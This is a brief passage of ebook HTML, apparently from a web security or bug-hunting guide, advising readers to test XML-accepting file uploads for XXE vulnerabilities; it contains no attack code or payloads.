<p class="indent">Keep an eye out for file uploads, especially those that take some form of XML. You should always test them for XXE vulnerabilities.<span epub:type="pagebreak" id="page_118"/></p>&#13;
</body></html>